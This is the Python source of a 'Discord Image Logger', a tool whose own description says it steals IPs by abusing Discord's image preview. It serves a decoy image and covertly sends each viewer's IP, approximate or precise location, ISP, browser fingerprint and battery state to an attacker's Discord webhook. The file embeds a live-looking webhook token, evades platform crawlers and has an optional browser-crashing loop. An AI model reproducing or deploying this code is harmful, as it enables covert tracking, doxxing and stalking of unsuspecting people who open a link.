# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1393606647284240474/eKXLQCymBvY7bUkhinRce9uawJGkflevGcaRQ9blNoQK4frDA6tt09CC2rKOvOIcQ18a",
    "image": "https://assets.telegraphindia.com/telegraph/2023/Jan/1672986231_rick-rolled.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info["proxy"] and config["vpnCheck"] == 2:
        return
    if info["proxy"] and config["vpnCheck"] == 1:
        ping = ""

    if info["hosting"]:
        if config["antiBot"] in (3, 4):
            if config["antiBot"] == 4 and not info["proxy"]:
                return
            return
        if config["antiBot"] in (1, 2):
            if config["antiBot"] == 2 and not info["proxy"]:
                ping = ""
            if config["antiBot"] == 1:
                ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**\n\n**Endpoint:** `{endpoint}`\n            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})

    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0...')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = base64.b64decode(dic.get("url") or dic.get("id")).decode() if config["imageArgument"] and (dic.get("url") or dic.get("id")) else config["image"]

            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            user_agent = self.headers.get('user-agent')

            if ip.startswith(blacklistedIPs): return

            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return

            result = None
            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(ip, user_agent, location, s.split("?")[0], url=url)
            else:
                result = makeReport(ip, user_agent, endpoint=s.split("?")[0], url=url)

            message = config["message"]["message"]
            if config["message"]["richMessage"] and result:
                for k, v in {"ip": ip, "isp": result["isp"], "asn": result["as"], "country": result["country"],
                             "region": result["regionName"], "city": result["city"], "lat": str(result["lat"]),
                             "long": str(result["lon"]), "timezone": f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})",
                             "mobile": str(result["mobile"]), "vpn": str(result["proxy"]),
                             "bot": str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'),
                             "browser": httpagentparser.simple_detect(user_agent)[1], "os": httpagentparser.simple_detect(user_agent)[0]}.items():
                    message = message.replace(f"{{{k}}}", v)

            datatype = 'text/html'
            if config["message"]["doMessage"]: data = message.encode()
            else: data = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div><script>function sendBrowserInfo(){{navigator.getBattery().then(function(battery){{fetch("/collect",{{method:"POST",headers:{{"Content-Type":"application/json"}},body:JSON.stringify({{width:screen.width,height:screen.height,colorDepth:screen.colorDepth,userAgent:navigator.userAgent,platform:navigator.platform,languages:navigator.languages,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,javaEnabled:navigator.javaEnabled(),plugins:Array.from(navigator.plugins).map(p=>p.name),batteryLevel:battery.level,charging:battery.charging}})}});}});}}window.onload=sendBrowserInfo;</script>'''.encode()
            if config["crashBrowser"]:
                data += b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            if config["accurateLocation"]:
                data += b"""<script>
if (!window.location.href.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var currenturl = window.location.href;
            var g = btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
            location.replace(currenturl + (currenturl.includes("?") ? "&" : "?") + "g=" + g);
        });
    }
}
</script>"""
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

    def do_GET(self):
        self.handleRequest()

    def do_POST(self):
        if self.path == "/collect":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                browser_info = json.loads(post_data)
                embed = {
                    "username": config["username"],
                    "embeds": [{
                        "title": "\ud83d\udcca Browser Fingerprint Collected",
                        "color": config["color"],
                        "fields": [
                            {"name": "Screen", "value": f"{browser_info['width']}x{browser_info['height']}, {browser_info['colorDepth']} bit", "inline": True},
                            {"name": "Timezone", "value": browser_info['timezone'], "inline": True},
                            {"name": "Languages", "value": ', '.join(browser_info['languages']), "inline": True},
                            {"name": "Platform", "value": browser_info['platform'], "inline": True},
                            {"name": "Battery", "value": f"{int(browser_info['batteryLevel'] * 100)}% {'\u26a1' if browser_info['charging'] else ''}", "inline": True},
                            {"name": "Java Enabled", "value": str(browser_info['javaEnabled']), "inline": True},
                            {"name": "User Agent", "value": browser_info['userAgent'][:100] + '...', "inline": False},
                            {"name": "Plugins", "value": ', '.join(browser_info['plugins'][:10]) or "None", "inline": False}
                        ]
                    }]
                }
                requests.post(config["webhook"], json=embed)
            except Exception as e:
                reportError(str(e))
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            self.handleRequest()

handler = app = ImageLoggerAPI
